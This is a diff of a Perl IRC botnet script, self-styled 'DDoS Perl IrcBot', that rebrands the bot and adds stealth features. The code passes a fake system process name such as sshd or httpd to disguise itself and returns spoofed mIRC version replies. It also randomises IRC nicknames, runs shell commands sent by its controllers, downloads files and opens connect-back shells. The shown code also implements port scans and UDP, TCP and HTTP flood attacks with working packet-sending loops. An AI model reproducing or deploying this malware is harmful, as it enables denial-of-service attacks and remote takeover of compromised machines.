@@ -2,7 +2,7 @@
  
 ######################################################################################################################
 ######################################################################################################################
-##  DDoS Perl IrcBot v1.0 / 2012 by lilmoe Security Team       ## [ Help ] #########################################
+##  DDoS Perl IrcBot v1.0 / 2012 by DDoS Security Team       ## [ Help ] ###########################################
 ##      Stealth MultiFunctional IrcBot writen in Perl          #######################################################
 ##        Teste on every system with PERL instlled             ##  !u @system                                       ##
 ##                                                             ##  !u @version                                      ##
@@ -12,7 +12,7 @@
 ######################################################################################################################
 ## [ Channel ] #################### [ Flood ] ################################## [ Utils ] ###########################
 ######################################################################################################################
-##  !u @join <#channel>            ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
+##  !u @join <#channel>          ##  !u @udp1 <ip> <port> <time>              ##  !u @cback <ip> <port>             ##
 ##  !u @part <#channel>          ##  !u @udp2 <ip> <packet size> <time>       ##  !u @downlod <url+path> <file>     ##
 ##  !u !uejoin <#channel>        ##  !u @udp3 <ip> <port> <time>              ##  !u @portscan <ip>                 ##
 ##  !u !op <channel> <nick>      ##  !u @tcp <ip> <port> <packet size> <time> ##  !u @mail <subject> <sender>       ##
@@ -33,30 +33,106 @@
 #############################
  
 my @rps = ("/usr/local/apache/bin/httpd -DSSL",
-           "/usr/sbin/httpd -k start -DSSL",
+                   "/usr/sbin/httpd -k start -DSSL",
            "/usr/sbin/httpd",
-           "/usr/sbin/sshd -i",
-           "/usr/sbin/sshd",
-           "/usr/sbin/sshd -D",
+                   "/usr/sbin/sshd -i",
+                   "/usr/sbin/sshd",
+               "/usr/sbin/sshd -D",
            "/usr/sbin/apache2 -k start",
-           "/sbin/syslogd",
-           "/sbin/klogd -c 1 -x -x",
-           "/usr/sbin/acpid",
-           "/usr/sbin/cron");
+               "/sbin/syslogd",
+               "/sbin/klogd -c 1 -x -x",
+                   "/usr/sbin/acpid",
+                   "/usr/sbin/cron");
 my $process = $rps[rand scalar @rps];
  
-my @rversion = ("lilmoe DDOS®");
+my @rversion = ("\001VERSION - unknown command.\001",
+                                "\001mIRC v5.91 K.Mardam-Bey\001",
+                                "\001mIRC v6.2 Khaled Mardam-Bey\001",
+                                "\001mIRC v6.03 Khaled Mardam-Bey\001",
+                                "\001mIRC v6.14 Khaled Mardam-Bey\001",
+                                "\001mIRC v6.15 Khaled Mardam-Bey\001",
+                                "\001mIRC v6.16 Khaled Mardam-Bey\001",
+                                "\001mIRC v6.17 Khaled Mardam-Bey\001",
+                                "\001mIRC v6.21 Khaled Mardam-Bey\001",
+                                "\001mIRC v6.31 Khaled Mardam-Bey\001",
+                                "\001mIRC v7.15 Khaled Mardam-Bey\001");
 my $vers = $rversion[rand scalar @rversion];
  
-my @rircname = ("moefo");
+my @rircname = ("abbore","ably","abyss","acrima","aerodream","afkdemon","ainthere","alberto","alexia","alexndra",
+                                "alias","alikki","alphaa","alterego","alvin","ambra","amed","andjela","andreas","anja",
+                                "anjing","anna","apeq","arntz","arskaz","as","asmodizz","asssa","athanas","aulis",
+                                "aus","bar","bast","bedem","beeth","bella","birillo","bizio","blackhand","blacky",
+                                "blietta","blondenor","blueangel","bluebus","bluey","bobi","bopoh","borre","boy","bram",
+                                "brigitta","brio","brrrweg","brujah","caprcorn","carloto","catgirl","cathren","cemanmp","chainess",
+                                "chaingone","chck","chriz","cigs","cintat","clarissa","clbiz","clex","cobe","cocker",
+                                "coke","colin","conan","condoom","coop","coopers","corvonero","countzero","cracker","cread",
+                                "crnaruka","cruizer","cubalibre","cure","custodes","dan","dangelo","danic","daniela","dario",
+                                "darker","darknz","davide","daw","demigd","des","devastor","diabolik","dimkam","dital",
+                                "djtt","dogzzz","dolfi","dolphin","dottmorte","dracon","dragon","drtte","dumbblnd","dusica",
+                                "ebe","edgie","eggist","einaimou","elef","elly","emmi","encer","engerim","erixon",
+                                "eurotrash","fairsight","fin","fireaway","fjortisch","floutti","fluffer","flum","forever","fqw",
+                                "fra","freem","freew","freud","funny","furia","furunkuli","fwsmou","gad","gamppy",
+                                "gerhard","ghostie","gili","girlie","giugno","gizmo","glidaren","gold","gomora","gracie",
+                                "grave","graz","grron","gsund","gufoao","hali","hallas","hammer","harri","harry",
+                                "hayes","hazor","herbiez","hlios","hoffi","honeii","hongkong","hug","iasv","ibanez",
+                                "ibanz","ibar","igi","illusins","imp","inkworks","iplord","ivan","ja","jaffa",
+                                "jaimeafk","james","jamezdin","janet","janne","jason","javagrl","jayc","jazz",
+                                "jejborta","jester","jj","jn","jockey","joe","joelbitar","johannes","johndow","johnny",
+                                "joni","jonni","jornx","joshua","jossumi","judy","juge","juha","juhas","julze",
+                                "juutsu","kajman","kalca","kamileon","kardinal","kasandra","katarina","kaviee","kbee","ken",
+                                "keung","kewin","khan","kikeli","kikii","kilroi","kiwi","klaara","kliimax","klimas",
+                                "kode","kojv","koopal","kralj","krash","krista","kronos","ktx","kungen","kuppa",
+                                "kurai","lala","lamour","latina","legend","lenisaway","lily","linda","lingyee","linux",
+                                "lisa","lisha","litta","littleboy","liverpoo","liyen","liz","liza","lonely","lonelygal",
+                                "lonewolf","lopez","lordie","lovebyte","lph","luarbiasa","lucignol","lullaby","lunatic","luny",
+                                "lupo","mac","macesgl","madd","mailman","malkav","malr","mamakians","mamaw","manarimou",
+                                "manarisou","maradona","marakana","marco","marillion","mark","mary","master","maurino","max",
+                                "mcalcota","melanie","melinda","meph","mephisto","mg","mhj","mhz","mig","miina",
+                                "mika","mikav","mike","mikemcgii","mikko","mikma","mimma","miss","moladmin","monikaw",
+                                "monkeyboy","monroe","monstop","mooks","mordeshur","mpdike","mrbate","mrbeauty","mrblom","mrbx",
+                                "mrjee","mro","mrtabizy","mrx","mrxx","msd","mu","muimui","musashi","musc",
+                                "musce","musicgal","muti","myboy","mystr","mythic","mywife","nallllle","nanask","natalie",
+                                "natborta","ncubus","neutrino","niceguy","nico","niklas","nimfa","nino","nurul","obiwanbip",
+                                "ogre","olivia","omega","only","orac","orace","oranzzzzz","organza","ourlove","outworld",
+                                "outzake","oxygn","paliadog","pazarac","permaloso","perroz","pessaar","phre","phreaky","pihkal",
+                                "pinball","poesje","poison","poofie","popy","powerpc","pper","primera","primetime","proxyma",
+                                "pshyche","psioncore","psiximou","psixisou","psychosis","psyidle","pszaah","puppetm","pzzzz",
+                                "quattro","question","ra","ragio","ragnetto","raiden","raindance","raistln","ranu","raska",
+                                "raul","raye","reartu","red","reflect","ribica","richard","rick","rigo","rikuta",
+                                "rikuxr","rita","rix","rob","roku","ronaldo","ronwrl","roticanai","rugiada","ruthless",
+                                "saalut","sammi","sand","satanins","schzsh","scorpin","sealink","sean","secret","serpentor",
+                                "servant","sethi","sexbolek","sexyman","sharmm","shearer","shekel","shio","shortys","shred",
+                                "sidewalk","sil","siren","skar","skill","skru","sky","skygun","skylink","slaktarn",
+                                "slash","slgon","smarties","smck","snake","snike","snoopgirl","sodoma","sopocani","sorceress",
+                                "spacebbl","spacedump","spanker","spermboy","spirtouli","srk","stazzz","steve","stinga","stj",
+                                "stjf","studenica","stussy","suez","suhoj","sukun","sunsola","surfer","sutera","svearike",
+                                "sweetii","sweetlady","sweklopi","swepilot","switch","syncphos","szern","takumura","tallaxlc","tampone",
+                                "tarabas","tatano","tato","tennis","tenx","terence","terkukur","tero","thefox","thesint",
+                                "timer","timewalk","tmhd","tnxfck","to","tomihki","tommy","topo","triumph","trustme",
+                                "tungau","tupac","turbozzzz","turing","tvrdjava","tysn","unicron","uoff","uptimer","utopia",
+                                "vader","vaismi","vajje","vanda","varjo","vass","vento","venusguy","vertie","viagara",
+                                "vicious","vidxxx","virex","vodafone","vone","vrgnie","vuubeibe","wanderer","warrr","wasabboy",
+                                "weebee","wellu","wendy","whiskey","willgood","wing","winny","wknight","wlly","wolfman",
+                                "wow","wp","xarasou","xtreme","xxx","xzone","yakzr","yang","yashy","yasin",
+                                "yenyen","ykbug","yogiebear","zai","zfstr","zinj","zizu","zvezda","zwimou","zwisou",
+                                "zwsiew","zwsiewale");
  
 my $ircname = $rircname[rand scalar @rircname];
  
+## my @rrealname = ("4,1[ lilmoe Security Team ]",
+##                                  "4,1 /!\ DDoS Security Team /!\ ",
+##                                  "12,1<///8,1///4,1###>",
+##                  "2,1---=== 4,1 DDoS Security Team 2,1===---");
+## chop (my $realname = $rrealname[rand scalar @rrealname]);
  
 chop (my $realname = $rircname[rand scalar @rircname]);
  
-my $nick =$rircname[rand scalar @rircname];
+## my @nickname = ("DDoS[U]");
+## my $nick =$nickname[rand scalar @nickname];
  
+my $nick =$rircname[rand scalar @rircname];
+
+
 $server = 'eu.undernet.org' unless $server;
 my $port = '6667';
  
@@ -64,7 +140,7 @@ my $linas_max='8';
 my $sleep='5';
  
 my $homedir = "/tmp";
-my $version = 'irc bot lilmoe.*®';
+my $version = 'DDoS Perl Bot v1.0';
  
 my @admins = ("lilmoe","moe");
 my @hostauth = ("lilmoe.users.undernet.org");
@@ -240,7 +316,7 @@ while( 1 ) {
           } elsif ($lines[$c] =~ /\r$/) {
           parse("$line");
           } elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
-          parse("$line"); 
+          parse("$line");
         } else {
       $line_temp = $line;
         }
@@ -258,7 +334,7 @@ sub parse {
     if ($args =~ /^\001VERSION\001$/) {
          notice("$pn", "".$vers."");
     }
-    if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
+        if (grep {$_ =~ /^\Q$hostmask\E$/i } @hostauth) {
     if (grep {$_ =~ /^\Q$pn\E$/i } @admins ) {
     if ($onde eq "$meunick"){
     shell("$pn", "$args");
@@ -292,9 +368,9 @@ elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
   $irc_servers{$IRC_cur_socket}{'nick'} = $meunick;
   $irc_servers{$IRC_cur_socket}{'nome'} = "$1";
   foreach my $canal (@channels) {
-    sendraw("MODE $nick +iw");
+        sendraw("MODE $nick +x");
     sendraw("JOIN $canal");
-    sendraw("PRIVMSG $canal :=> perl irc bot by lilmoe has forked successfully!");
+        sendraw("PRIVMSG $canal :4,1 [lilmoes's dd0s b0ts] 9,1Lets DDOSSSS!... ");
 }
 }
 }
@@ -313,92 +389,92 @@ my $funcarg = $_[1];
 ###########################
  
 if ($funcarg =~ /^help/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1lilmoe  PerlBot Main Help:  ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1system              ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1version             ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1channel             ");   
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1flood               ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1utils               ");   
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1DDoS PerlBot Main Help:  ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1system              ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1version             ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1channel             ");      
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1flood               ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1utils               ");      
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
 }
  
 if ($funcarg =~ /^system/) {
-    $uptime=`uptime`;
-    $ownd=`pwd`; 
-    $id=`id`;
-    $uname=`uname -srp`;
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1Bot Configuration:  ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Server       : 12$server "); 
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Port         : 12$port ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Channels     : 12@channels ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*uname -a     : 12$uname ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*uptime       : 12$uptime ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*FakeProcess  : 12$process ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*ProcessPID   : 12$$ ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*ID           : 12$id ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Own Dir      : 12$ownd ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
+        $uptime=`uptime`;
+        $ownd=`pwd`;
+        $id=`id`;
+        $uname=`uname -srp`;
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1Bot Configuration:  ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Server       : 12$server ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Port         : 12$port ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Channels     : 12@channels ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*uname -a     : 12$uname ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*uptime       : 12$uptime ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*FakeProcess  : 12$process ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*ProcessPID   : 12$$ ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*ID           : 12$id ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1*Own Dir      : 12$ownd ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [System] 9,1=================== ");
 }
  
 if ($funcarg =~ /^version/){
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1Bot Informations:                  ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Version : 12$version   ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Creator 0rmer             ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Year    : 122012                ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1Bot Informations:                  ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Version : 12$version   ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Creator : 12DDoS             ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Year    : 122012                ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
 }
  
 if ($funcarg =~ /^flood/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1lilmoe  PerlBot Flood Help: ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp1 <ip> <port> <time>               ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp2 <ip> <packet size> <time>        ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp3 <ip> <port> <time>               ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1tcp <ip> <port> <packet size> <time>  ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1http <site> <time>                    ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1ctcpflood <nick>                      ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1msgflood <nick>                       ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1noticeflood <nick>                    ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1DDoS PerlBot Flood Help: ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp1 <ip> <port> <time>               ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp2 <ip> <packet size> <time>        ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1udp3 <ip> <port> <time>               ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1tcp <ip> <port> <packet size> <time>  ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1http <site> <time>                    ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1ctcpflood <nick>                      ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1msgflood <nick>                       ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1noticeflood <nick>                    ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
 }
  
 if ($funcarg =~ /^channel/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1lilmoe  PerlBot Channel Help:     ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1join <channel>            ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1part <channel>            ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1rejoin <channel>          ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1op <channel> <nick>       ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1deop <channel> <nick>     "); 
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1voice <channel> <nick>    ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1devoice <channel> <nick>  ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1nick <newnick>            ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1msg <nick>                ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1quit                      "); 
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1die                       ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1DDoS PerlBot Channel Help:     ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1join <channel>            ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1part <channel>            ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1rejoin <channel>          ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1op <channel> <nick>       ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1deop <channel> <nick>     ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1voice <channel> <nick>    ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1devoice <channel> <nick>  ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1nick <newnick>            ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1msg <nick>                ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1quit                      ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12!9,1die                       ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
 }
  
 if ($funcarg =~ /^utils/) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1lilmoe  PerlBot Utils Help:                            ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1cback <ip> <port>                              ");    
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1download <url+path> <file>                     ");    
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1mail <subject> <sender> <recipient> <message>  ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1dns <ip>                                       ");  
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1port <ip> <port>                               ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1portscan <ip>                                  ");  
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u pwd (for example)                               ");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1DDoS PerlBot Utils Help:                            ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1cback <ip> <port>                              ");   
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1download <url+path> <file>                     ");   
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1mail <subject> <sender> <recipient> <message>  ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1dns <ip>                                       ");   
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1port <ip> <port>                               ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u 12@9,1portscan <ip>                                  ");   
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1!u pwd (for example)                               ");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
 }
  
 #########################
@@ -406,17 +482,17 @@ if ($funcarg =~ /^utils/) {
 #########################
  
 if ($funcarg =~ /^die/) {
-    sendraw($IRC_cur_socket, "QUIT :");
-    $killd = "kill -9 ".fork;
-    system (`$killd`);
+        sendraw($IRC_cur_socket, "QUIT :");
+        $killd = "kill -9 ".fork;
+        system (`$killd`);
 }
-########### 
+###########    
 if ($funcarg =~ /^join (.*)/) {
-    sendraw($IRC_cur_socket, "JOIN ".$1);
+        sendraw($IRC_cur_socket, "JOIN ".$1);
 }
  
 if ($funcarg =~ /^part (.*)/) {
-    sendraw($IRC_cur_socket, "PART ".$1);
+        sendraw($IRC_cur_socket, "PART ".$1);
 }
 ###########
 if ($funcarg =~ /^portscan (.*)/) {
@@ -439,26 +515,26 @@ if ($funcarg =~ /^portscan (.*)/) {
 }
 ##############
 if ($funcarg =~ /^download\s+(.*)\s+(.*)/) {
-    getstore("$1", "$2");
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Download] 9,1Downloaded the file: 12$2 9,1from 12$1 ");
+        getstore("$1", "$2");
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Download] 9,1Downloaded the file: 12$2 9,1from 12$1 ");
 }
 ##############
-if ($funcarg =~ /^dns\s+(.*)/){ 
-    my $nsku = $1;
-    $mydns = inet_ntoa(inet_aton($nsku));
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [DNS] 9,1Resolved: 12$nsku 9,1to 12$mydns ");
+if ($funcarg =~ /^dns\s+(.*)/){
+        my $nsku = $1;
+        $mydns = inet_ntoa(inet_aton($nsku));
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [DNS] 9,1Resolved: 12$nsku 9,1to 12$mydns ");
 }
 ##############
 if ($funcarg=~ /^port\s+(.*?)\s+(.*)/ ) {
-    my $hostip= "$1";
-    my $portsc= "$2";
-    my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);
-    if ($scansock) {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [PORT] 9,1Connection to 12$hostip9,1:12$portsc 9,1is 12Accepted. ");
-    }
-    else {
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [PORT] 9,1Connection to 12$hostip9,1:12$portsc 9,1is 4Refused. ");
-    }
+        my $hostip= "$1";
+        my $portsc= "$2";
+        my $scansock = IO::Socket::INET->new(PeerAddr => $hostip, PeerPort => $portsc, Proto =>'tcp', Timeout => 7);
+        if ($scansock) {
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [PORT] 9,1Connection to 12$hostip9,1:12$portsc 9,1is 12Accepted. ");
+        }
+        else {
+        sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [PORT] 9,1Connection to 12$hostip9,1:12$portsc 9,1is 4Refused. ");
+        }
 }
 ##############
 if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
@@ -469,31 +545,31 @@ if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
     my $dtime = "$3";
     my $pacote;
     my $pacotese;
-    my $size = 0;
+        my $size = 0;
     my $fim = time + $dtime;
     my $pacota = 1;
-    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 lilmoe ] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
-    while (($pacota == "1") && ($pacotes == "1")) {
+    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 DDOS] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
+        while (($pacota == "1") && ($pacotes == "1")) {
             $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
             $pacote = $size ? $size : int(rand(1024-64)+64) ;
             $porta = int(rand 65000) +1 if ($porta == "0");
             #send(Tr0x, 0, $pacote, sockaddr_in($porta, $alvo));
             send(Tr0x, pack("a$pacote","Tr0x"), 0, pack_sockaddr_in($porta, $alvo));
             }
